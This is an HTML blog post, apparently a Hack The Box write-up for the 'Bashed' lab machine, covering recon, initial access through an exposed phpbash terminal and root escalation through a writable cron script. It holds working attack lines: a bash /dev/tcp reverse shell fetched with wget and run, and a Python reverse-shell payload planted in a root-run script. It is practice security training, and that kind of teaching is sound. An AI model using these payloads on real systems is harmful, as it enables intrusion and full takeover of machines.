@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Bashed is an easy box that requires you to find an interactive terminal to get initial access to the system.  From here we discover that we have permissions to edit a script that root is running as">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Bashed">
+<meta property="og:url" content="https://k1ckstand.github.io/2022/07/21/bashed/index.html">
+<meta property="og:site_name" content="k1ckstand">
+<meta property="og:description" content="Bashed is an easy box that requires you to find an interactive terminal to get initial access to the system.  From here we discover that we have permissions to edit a script that root is running as">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://k1ckstand.github.io/2022/07/21/bashed/Bashed.png">
+<meta property="og:image" content="https://k1ckstand.github.io/2022/07/21/bashed/web_1.png">
+<meta property="og:image" content="https://k1ckstand.github.io/2022/07/21/bashed/web_2.png">
+<meta property="og:image" content="https://k1ckstand.github.io/2022/07/21/bashed/dev_dir.png">
+<meta property="og:image" content="https://k1ckstand.github.io/2022/07/21/bashed/page.png">
+<meta property="article:published_time" content="2022-07-21T14:13:23.000Z">
+<meta property="article:modified_time" content="2022-07-29T18:54:27.274Z">
+<meta property="article:author" content="k1ckstand">
+<meta property="article:tag" content="bash">
+<meta property="article:tag" content="pivot">
+<meta property="article:tag" content="cron">
+<meta property="article:tag" content="linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://k1ckstand.github.io/2022/07/21/bashed/Bashed.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB: Bashed</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    <!--  -->
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <!-- <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a> -->
+  <span id="menu">
+
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/07/21/blue/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/07/20/shocker/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <!-- <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li> -->
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <!-- <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://k1ckstand.github.io/2022/07/21/bashed/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://k1ckstand.github.io/2022/07/21/bashed/&text=HTB: Bashed"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://k1ckstand.github.io/2022/07/21/bashed/&title=HTB: Bashed"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://k1ckstand.github.io/2022/07/21/bashed/&is_video=false&description=HTB: Bashed"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB: Bashed&body=Check out this article: https://k1ckstand.github.io/2022/07/21/bashed/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://k1ckstand.github.io/2022/07/21/bashed/&title=HTB: Bashed"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://k1ckstand.github.io/2022/07/21/bashed/&title=HTB: Bashed"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://k1ckstand.github.io/2022/07/21/bashed/&title=HTB: Bashed"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://k1ckstand.github.io/2022/07/21/bashed/&title=HTB: Bashed"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://k1ckstand.github.io/2022/07/21/bashed/&name=HTB: Bashed&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://k1ckstand.github.io/2022/07/21/bashed/&t=HTB: Bashed"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul> -->
+
+    </div>
+    <!-- <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#h1"><span class="toc-number">1.</span> <span class="toc-text">h1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#h2"><span class="toc-number">1.1.</span> <span class="toc-text">h2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#h3"><span class="toc-number">1.1.1.</span> <span class="toc-text">h3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#h4"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">h4</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-User"><span class="toc-number">2.</span> <span class="toc-text">Getting User</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">2.0.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Front-Page"><span class="toc-number">2.0.2.</span> <span class="toc-text">Front Page</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Second-Page"><span class="toc-number">2.0.3.</span> <span class="toc-text">Second Page</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-bashed-htb-dev"><span class="toc-number">2.0.4.</span> <span class="toc-text">http:&#x2F;&#x2F;bashed.htb&#x2F;dev</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-Root"><span class="toc-number">3.</span> <span class="toc-text">Getting Root</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div> -->
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+
+
+    <header id="header">
+      <a href="/">
+      
+        
+          <div id="logo" style="background-image: url(/images/finn.png);"></div>
+        
+      
+        <div id="title">
+          <h1>k1ckstand</h1>
+        </div>
+      </a>
+      <div id="nav">
+        <ul>
+          <li class="icon">
+            <a href="#" aria-label="Menu"><i class="fas fa-bars fa-2x"></i></a>
+          </li>
+          <!--
+         --><li><a href="/">Home</a></li><!--
+       --><!--
+         --><li><a href="/about/">About</a></li><!--
+       --><!--
+         --><li><a href="/search/">Search</a></li><!--
+       -->
+        </ul>
+      </div>
+    </header>
+    
+
+    <header>
+      
+    <h1 class="posttitle" itemprop="name headline">
+        HTB: Bashed
+    </h1>
+
+
+
+      <div class="meta">
+        <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <span itemprop="name">k1ckstand</span>
+        </span>
+        
+    <div class="postdate">
+      
+        <time datetime="2022-07-21T14:13:23.000Z" itemprop="datePublished">2022-07-21</time>
+        
+      
+    </div>
+
+
+        
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/HTB/">HTB</a>
+    </div>
+
+
+        
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/bash/" rel="tag">bash</a>, <a class="tag-link-link" href="/tags/cron/" rel="tag">cron</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/pivot/" rel="tag">pivot</a>
+    </div>
+
+
+      </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img src="/2022/07/21/bashed/Bashed.png" class="">
+
+<p>Bashed is an easy box that requires you to find an interactive terminal to get initial access to the system.  From here we discover that we have permissions to edit a script that root is running as a cron job.  Let’s get started.</p>
+<hr>
+<h1 id="h1"><a href="#h1" class="headerlink" title="h1"></a>h1</h1><h2 id="h2"><a href="#h2" class="headerlink" title="h2"></a>h2</h2><h3 id="h3"><a href="#h3" class="headerlink" title="h3"></a>h3</h3><h4 id="h4"><a href="#h4" class="headerlink" title="h4"></a>h4</h4><h1 id="Getting-User"><a href="#Getting-User" class="headerlink" title="Getting User"></a>Getting User</h1><p>Start out by adding the box to our host file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="string">&#x27;echo &quot;10.10.10.68 bashed.htb&quot; &gt;&gt; /etc/hosts&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>The only finding of relevance nmap found was that we have a web server running</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[ none@k1ckstand bashed ]$ nmap -sCV bashed.htb</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 08:37 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bashed.htb (10.10.10.68)</span><br><span class="line">Host is up (0.088s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Arrexel<span class="string">&#x27;s Development Site</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 11.20 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p>Gobuster found a few directories.  The finding of relevance is going to be the <code>/dev</code> folder.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[ none@k1ckstand bashed ]$ gobuster <span class="built_in">dir</span> -u http://10.10.10.68 -w /opt/word_list/SecLists/Discovery/Web-Content/common.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.10.68</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /opt/word_list/SecLists/Discovery/Web-Content/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/07/28 08:49:29 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.hta                 (Status: 403) [Size: 290]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 295]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 295]</span><br><span class="line">/css                  (Status: 301) [Size: 308] [--&gt; http://10.10.10.68/css/]</span><br><span class="line">/dev                  (Status: 301) [Size: 308] [--&gt; http://10.10.10.68/dev/]</span><br><span class="line">/fonts                (Status: 301) [Size: 310] [--&gt; http://10.10.10.68/fonts/]</span><br><span class="line">/images               (Status: 301) [Size: 311] [--&gt; http://10.10.10.68/images/]</span><br><span class="line">/index.html           (Status: 200) [Size: 7743]</span><br><span class="line">/js                   (Status: 301) [Size: 307] [--&gt; http://10.10.10.68/js/]</span><br><span class="line">/php                  (Status: 301) [Size: 308] [--&gt; http://10.10.10.68/php/]</span><br><span class="line">/server-status        (Status: 403) [Size: 299]</span><br><span class="line">/uploads              (Status: 301) [Size: 312] [--&gt; http://10.10.10.68/uploads/]</span><br></pre></td></tr></table></figure>
+
+<p>The site has no real functionality but does make a reference to <a target="_blank" rel="noopener" href="https://github.com/Arrexel/phpbash">this</a> github repo.</p>
+<h3 id="Front-Page"><a href="#Front-Page" class="headerlink" title="Front Page"></a>Front Page</h3><img src="/2022/07/21/bashed/web_1.png" class="">
+
+<h3 id="Second-Page"><a href="#Second-Page" class="headerlink" title="Second Page"></a>Second Page</h3><img src="/2022/07/21/bashed/web_2.png" class="">
+
+<p>Taking a look at the dev directory found in our gobuster results we find two php files. </p>
+<h3 id="http-bashed-htb-dev"><a href="#http-bashed-htb-dev" class="headerlink" title="http://bashed.htb/dev"></a><a target="_blank" rel="noopener" href="http://bashed.htb/dev">http://bashed.htb/dev</a></h3><img src="/2022/07/21/bashed/dev_dir.png" class="">
+
+<p><code>phpbash.php</code> takes us to a page that provides an interactive terminal.  Using this we can upload and execute our reverse shell.</p>
+<p>On localhost</p>
+<ul>
+<li>echo “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.5&#x2F;4325 0&gt;&amp;1” &gt; rshell</li>
+<li><code>python3 -m http.server</code></li>
+<li>On a separate tab: <code>nc -lvn 4325</code></li>
+</ul>
+<p>On phpbash.php</p>
+<ul>
+<li><code>cd /tmp</code></li>
+<li><code>wget 10.10.14.5:8000/rshell</code></li>
+<li><code>chmod 777 rshell</code></li>
+<li><code>./rshell</code></li>
+</ul>
+<img src="/2022/07/21/bashed/page.png" class="">
+
+<p>And we get a call back.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[ none@k1ckstand ~ ]$ nc -lvn 4326</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (840): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@bashed:/tmp$ <span class="built_in">cd</span> /home</span><br><span class="line">www-data@bashed:/home$ <span class="built_in">ls</span></span><br><span class="line">arrexel  scriptmanager</span><br><span class="line">www-data@bashed:/home$ <span class="built_in">cd</span> arrexel</span><br><span class="line">www-data@bashed:/home/arrexel$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">www-data@bashed:/home/arrexel$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">9348c...........................</span><br></pre></td></tr></table></figure>
+
+<h1 id="Getting-Root"><a href="#Getting-Root" class="headerlink" title="Getting Root"></a>Getting Root</h1><p>Running <code>sudo -l</code> shows that we can run anything as the user <code>scriptmanager</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@bashed:/home/arrexel$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on bashed:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on bashed:</span><br><span class="line">    (scriptmanager : scriptmanager) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
+
+<p>Next lets get <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy"><code>psspy</code></a> on the system.  Much like uploading the reverse shell we can just setup a python web server and <code>wget</code> our local copy of <code>psspy</code> on the other side.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">www-data@bashed:/tmp$ wget 10.10.14.5:8000/pspy64s</span><br><span class="line">www-data@bashed:/tmp$ <span class="built_in">chmod</span> +x pspy64s</span><br><span class="line">www-data@bashed:/tmp$ ./pspy64s</span><br><span class="line">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒</span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░</span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░</span><br><span class="line">                   ░           ░ ░</span><br><span class="line">                               ░ ░</span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=<span class="literal">true</span>): processes=<span class="literal">true</span> | file-system-events=<span class="literal">false</span> ||| Scannning <span class="keyword">for</span> processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">&lt;... SNIP ...&gt;</span><br><span class="line"></span><br><span class="line">2022/07/21 10:01:01 CMD: UID=0    PID=42959  | /usr/sbin/CRON -f</span><br><span class="line">2022/07/21 10:01:01 CMD: UID=0    PID=42961  | python test.py</span><br><span class="line">2022/07/21 10:01:01 CMD: UID=0    PID=42960  | /bin/sh -c <span class="built_in">cd</span> /scripts; <span class="keyword">for</span> f <span class="keyword">in</span> *.py; <span class="keyword">do</span> python <span class="string">&quot;<span class="variable">$f</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line">2022/07/21 10:02:01 CMD: UID=0    PID=42964  | python test.py</span><br><span class="line">2022/07/21 10:02:01 CMD: UID=0    PID=42963  | /bin/sh -c <span class="built_in">cd</span> /scripts; <span class="keyword">for</span> f <span class="keyword">in</span> *.py; <span class="keyword">do</span> python <span class="string">&quot;<span class="variable">$f</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line">2022/07/21 10:02:01 CMD: UID=0    PID=42962  | /usr/sbin/CRON -f</span><br><span class="line">2022/07/21 10:03:01 CMD: UID=0    PID=42965  | /usr/sbin/CRON -f</span><br><span class="line">2022/07/21 10:03:01 CMD: UID=0    PID=42967  | python test.py</span><br><span class="line">2022/07/21 10:03:01 CMD: UID=0    PID=42966  | /bin/sh -c <span class="built_in">cd</span> /scripts; <span class="keyword">for</span> f <span class="keyword">in</span> *.py; <span class="keyword">do</span> python <span class="string">&quot;<span class="variable">$f</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line">2022/07/21 10:04:01 CMD: UID=0    PID=42968  | /usr/sbin/CRON -f</span><br><span class="line">2022/07/21 10:04:01 CMD: UID=0    PID=42970  | python test.py</span><br><span class="line">2022/07/21 10:04:01 CMD: UID=0    PID=42969  | /bin/sh -c <span class="built_in">cd</span> /scripts; <span class="keyword">for</span> f <span class="keyword">in</span> *.py; <span class="keyword">do</span> python <span class="string">&quot;<span class="variable">$f</span>&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>Looks like we got a cron job running as root.  Let’s see if we can figure out what’s going on.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> / -Falts | grep script</span><br><span class="line"> 4 drwxrwxr--   2 scriptmanager scriptmanager  4096 Jul 21 06:08 scripts/</span><br></pre></td></tr></table></figure>
+
+<p>We won’t be able to look into the directory as <code>www-data</code> but we can sudo our way over to <code>scriptmanager</code> and take a peek.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@bashed:/$ sudo -u scriptmanager <span class="built_in">ls</span> -Flaths /scripts</span><br><span class="line">sudo -u scriptmanager <span class="built_in">ls</span> -Flaths /scripts</span><br><span class="line">total 16K</span><br><span class="line">4.0K drwxrwxr--  2 scriptmanager scriptmanager 4.0K Jul 21 06:08 ./</span><br><span class="line">4.0K -rw-r--r--  1 scriptmanager scriptmanager  274 Jul 21 06:08 test.py</span><br><span class="line">4.0K -rw-r--r--  1 root          root            12 Jul 21 06:06 test.txt</span><br><span class="line">4.0K drwxr-xr-x 23 root          root          4.0K Jun  2 07:25 ../</span><br></pre></td></tr></table></figure>
+
+<p>Taking a look at <code>test.py</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@bashed:/$ sudo -u scriptmanager <span class="built_in">cat</span> /scripts/test.py</span><br><span class="line">sudo -u scriptmanager <span class="built_in">cat</span> /scripts/test.py</span><br><span class="line">f = open(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;testing 123!&quot;</span>)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure>
+
+<p>Taking a look at <code>test.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@bashed:/$ sudo -u scriptmanager <span class="built_in">cat</span> /scripts/test.txt</span><br><span class="line">sudo -u scriptmanager <span class="built_in">cat</span> /scripts/test.txt</span><br><span class="line">testing 123!www-data@bashed:/$</span><br></pre></td></tr></table></figure>
+
+<p>At this point all we need to do is drop a reverse shell into <code>test.py</code> using our sudo permissions as scriptmanager.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@bashed:/home$ sudo -u scriptmanager vi /scripts/test.py</span><br><span class="line"><span class="comment">#f = open(&quot;test.txt&quot;, &quot;w&quot;)</span></span><br><span class="line"><span class="comment">#f.write(&quot;testing 123!&quot;)</span></span><br><span class="line"><span class="comment">#f.close</span></span><br><span class="line"></span><br><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;10.10.14.5&quot;</span>,1234))</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>Next lets set up our netcat listener and wait for the cron job to kick off.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[ none@k1ckstand ~ ]$ nc -lvn 1234</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">test.py</span></span><br><span class="line"><span class="string">test.txt</span></span><br><span class="line"><span class="string"># cd /root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">root.txt</span></span><br><span class="line"><span class="string"># cat root.txt</span></span><br><span class="line"><span class="string">3bc75........................</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+
+  </div>
+</article>
+<!-- 
+ -->
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#h1"><span class="toc-number">1.</span> <span class="toc-text">h1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#h2"><span class="toc-number">1.1.</span> <span class="toc-text">h2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#h3"><span class="toc-number">1.1.1.</span> <span class="toc-text">h3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#h4"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">h4</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-User"><span class="toc-number">2.</span> <span class="toc-text">Getting User</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">2.0.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Front-Page"><span class="toc-number">2.0.2.</span> <span class="toc-text">Front Page</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Second-Page"><span class="toc-number">2.0.3.</span> <span class="toc-text">Second Page</span></a></li><li class="toc-item 